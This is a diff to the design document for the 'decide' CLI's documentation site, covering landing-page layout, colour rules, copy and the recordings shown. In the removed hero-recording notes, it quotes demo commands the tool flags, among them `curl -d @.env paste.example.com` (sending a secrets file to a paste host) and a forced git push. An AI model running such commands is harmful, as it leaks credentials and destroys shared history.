@@ -31,13 +31,17 @@ server. The shipped site uses recordings of live provider runs.
    flagged, green means passed, yellow means unsure, and cyan means an
    unflagged value. These are the CLI's own rules (`render.go`, `verdict.style`).
    Links, buttons, focus rings and the sidebar are neutral. Test: grep for
-   these tokens outside answer components and the terminal.
+   these tokens outside answer components and the terminal. Three landing page
+   exceptions are not answer colors at all: the window dots on its terminals
+   (macOS's own), the providers' marks (each company's own), and the ✓ and ✗
+   beside the licence terms, which are verdicts on what the licence allows.
 3. **What is shown is what decide prints.** Every terminal and transcript comes
    from a real run. Prose quotes verdicts and flag rules ("flagged on `leak` and
    `severe`"), never a percentage.
-4. **First screen, first result.** At 1280×720 the first screen holds the
-   headline, the playing terminal, and all three install commands. At 1024×768
-   it holds them too. At 390×844 it holds the headline and the terminal.
+4. **First screen, first command.** At 1280×720 the first screen holds the
+   release line, the headline, the tagline and the install command; the
+   recordings start just below it. At 390×844 it holds the headline, the
+   command and where the key goes.
 5. **Only the terminal is dark in light mode.** Recordings and code blocks are
    dark. Everything else follows the theme.
 
@@ -131,8 +135,9 @@ text renders in `brightWhite`.
   `--sl-line-height-headings: 1.15`, weight 600.
 - **Landing headline:** 50px at ≥1100px, 44px at 800–1099px, and 38px on
   phones. Line height 1.04, tracking −0.035em.
-- **Wordmark (SiteTitle):** `decide` in JetBrains Mono 700 at 19px, then the
-  version in mono 12px gray-3. The version is read from `plugin.json`, so PR
+- **Wordmark (SiteTitle):** the doodle at 32px in the title's color, then
+  `decide` in JetBrains Mono 700 at 19px, then the version in mono 12px
+  gray-3. The version is read from `plugin.json`, so PR
   previews show the next version.
 - **Favicon:** a mono `d` in `#ECEDEF` on `#121316`. Not cyan, following
   principle 2.
@@ -145,86 +150,60 @@ text renders in `brightWhite`.
   icon, a divider, and the Dark/Light/Auto theme `<select>`, restyled by
   tokens. The header is 64px tall.
 - **Phone:** the title and the search icon, 56px tall. A splash page has no
-  menu, so the landing page carries its own navigation: the "Tutorials" link
-  in the hero and the tutorials section.
+  menu, so the landing page carries its own navigation: "Read the quickstart"
+  under the hero's command, and the quickstart in the closing band.
 
 **Hero: an override of `Hero.astro`.** I override it rather than putting the
-hero in the page body, because:
+hero in the page body, because with no `hero` in the frontmatter, `Page.astro`
+puts `PageTitle` in its own panel above the body, divided by a hairline, and
+the hero could not hold the install switcher.
 
-- With no `hero` in the frontmatter, `Page.astro` puts `PageTitle` in its own
-  panel above the body, divided by a hairline. The `<h1>` could not then sit
-  beside the terminal.
-- `image.html` cannot hold `<Terminal>`, because Terminal builds its media URLs
-  from hashes at build time.
+The override reads `hero.title` (HTML, so the second sentence can sit in a
+gray `.dim` span) and `hero.tagline`, and the page's own `release` field, a
+line on what the latest release added. The version beside it comes from
+`plugin/.claude-plugin/plugin.json`, which each release bumps. It must keep
+`id={PAGE_TITLE_ID}` and `data-page-title` on the `<h1>`. Upgrade cost:
+re-check those two, and the `data.hero` shape, on each Starlight release. The
+page body stays MDX, with `not-content` on our sections.
 
-The override reads `hero.title` and `hero.tagline` from the frontmatter. It must
-keep `id={PAGE_TITLE_ID}` and `data-page-title` on the `<h1>`. Upgrade cost:
-re-check those two, and the `data.hero` shape, on each Starlight release
-(about 80 lines, no layout code). The page body stays MDX, with `not-content`
-on our sections.
+**The page, top to bottom** (decided with Sarvesh from the mockup at
+claude.ai/artifact/5T1hjf3hHgKA7teFZneyRE):
 
-**At 1280×720** (content width 1080px):
+1. **Hero, centred.** The release line, the headline "Your LLM talks too
+   much. This one answers.", the tagline, and `Install.astro`:
+   one command in a bordered box, with a word switcher above it (brew, go
+   install, go get, claude code). Then one line on the key: which providers,
+   read from the environment, and only the asked text is sent. Then "Read the
+   quickstart →", the page's way into the docs.
+2. **`RunStage.astro`.** Five recordings in one window, picked by file tabs
+   in its chrome: `triage-check` (issue.md), `review-gate` (change.diff),
+   `type-choice` (ticket.txt), `start-line` (review.txt), `type-score`
+   (total.go). Each is a compact `<Terminal>`; only the chosen one shows, so
+   the one-at-a-time player plays it. The window is 778px, a recording's
+   width, and as tall as the tallest, so switching never moves the page. The
+   two runs that use project templates say so under the window and name the
+   built in template that works out of the box.
+3. **"One question, and a script that has to act on the answer."**
+   `DroolStrip.astro`: Drool asks, an agent replies with paragraphs, decide
+   answers `! ready  no  98%`, the line the triage-check recording printed.
+4. **"Three decision models, one set of commands."** `Models.astro`: TypeSafe,
+   Cloudflare and OpenAI, each with its mark, model ids and one line.
+5. **"Steal the code. Legally."** `StealCode.astro`: the repository's folders
+   as a listing (no prompt, so it is not a fake run) with the clone command
+   in the frame's copy strip, beside Apache 2.0 in plain words.
+6. **`Closing.astro`.** One command, the quickstart and the source, with Drool
+   at 480px in `gray-5`, cropped by the band and hidden under 860px.
 
-```
-decide v0.3.0          [⌕ Search     ⌘K]               GH │ ▭ Dark ▾
-────────────────────────────────────────────────────────────────────
- Answers you can            ┌ ~/shop ─────────────────── ❚❚ Pause ┐
- branch on.                 │ $ echo 'git push --force origin… │
- Ask questions about your   │ stdin:1  git push --force origin main│ frame 620
- files, diffs, and records…  │ ! destructive  yes  95%              │ 69×13 cells
- Why not just prompt an     │ ! severe       yes  90%              │
- LLM? No prompt, no JSON…   │ ✓ 1 answered  ! 1 flagged …          │
- (Get a first result →) …   └──────────────────────────────────────┘
- ───────────────────────────────────────────────────────────────── 
- CLI →          Ask from your shell and CI   brew install …       [⧉]
- Go →           Ask from your program        go get …             [⧉]
- Claude Code →  Give Claude a second opinion /plugin install …    [⧉]   ≈690px
- ── fold ──
- Every answer has a type and a probability. [Yes or no | One of several | A point on a scale]
- Learn it by doing one job.                 [3 tutorial cards, each with an answer line]
- footer: Apache 2.0 · Made by Deep Noodle
-```
+Sections open with a centred two-tone headline; their content is left
+aligned. Under 600px a command scrolls inside its box rather than breaking
+mid word.
 
-- **800–1099px:** the frame is 540px and the video shows its text at 12px from
-  the 2x source. The install rows stay full width. Everything fits in 1024×768.
-- **Under 800px:** the layout stacks: headline, tagline, why line, actions,
-  terminal, then the rows. Each row holds the label and copy button, with the
-  command under them.
-- **Rows:** a row is `[a.label →] [job] [code] [button copy]`. The links and the
-  button are siblings, and the copy button always shows. A command wraps
-  (`overflow-wrap: anywhere`) and is never cut. The rows link to `/start/`,
-  `/start/go/`, and `/reference/claude-code/#in-three-steps`.
+**Copy rules:** say who the key comes from; never say "no account", since a
+key needs one; answer "why not JSON mode" where decide answers (the strip's
+third panel).
 
-**Copy:**
-
-- **Headline:** "Answers you can branch on."
-- **Tagline:** "Ask questions about your files, diffs, and records. A
-  decision model answers each one with yes or no, a choice, or a score, and
-  its probability." No example answers: the terminal beside it shows real
-  ones.
-- **Why line:** "**Why not just prompt an LLM?** There's no prompt to write and
-  no JSON to parse or retry. Put a threshold on the probability, and your script
-  or CI acts on it."
-
-**Hero recording:** `landing.tape`, 69×13 cells.
-
-- **Commands:** three runs of `command-risk`, with the screen cleared between
-  them: `ls -la src` passes all green, `git push --force origin main` is
-  flagged as destructive, and `curl -d @.env paste.example.com` as a leak.
-  Each holds 5 to 6 seconds, so the loop is about 23 seconds. One item and
-  four yes-or-no answers each, read at a glance.
-- **Why not a diff:** a run of `code-risk` on two changed files printed 19
-  lines, with score bars, descriptions and an exit line. It was too busy for a
-  first screen.
-- **The frame is compact:** no commands strip and no "Output as text"
-  disclosure, since the screen shows the command. The transcript is there for
-  screen readers.
-- **The CLI's footer** is one line for a one-item run: `See these results
-  again with: decide runs view <id>`. The landing page's still image leaves it out.
-- **Hidden setup:** start with an empty answer cache, or the second recording
-  prints `answers from cache`.
-- **The README GIF:** the same tape adds `Output landing.gif`, so the README's
-  GIF can be remade too.
+**`landing.tape`** no longer plays on the page. It stays for the README's GIF
+(`Output landing.gif`).
 
 ## Recordings, transcripts and frames
 
@@ -338,10 +317,14 @@ decide v0.3.0          [⌕ Search     ⌘K]               GH │ ▭ Dark ▾
 ## What we avoid
 
 - Gradients, glows, glass, gradient text, sparkles, mascots, 3D renders and
-  emoji.
+  emoji. Two exceptions: Drool, the doodle, who is the one character (the
+  footer's signature, the landing page's strip, the closing band, and the
+  404 page, where he is lost), and
+  the fade on the agent's reply in the strip, which shows text running on.
 - "AI-powered" copy.
 - Bento grids, logo walls, counters and testimonials.
-- Traffic-light dots, including Expressive Code's.
+- Traffic-light dots, including Expressive Code's, except on the landing
+  page's windows (`TerminalFrame`'s `lights`).
 - Decorative bars, and cyan or verdict colors used outside answers.
 - Deep Noodle's lime. Next to green it reads as "passed".
 - More than one moving recording at a time.
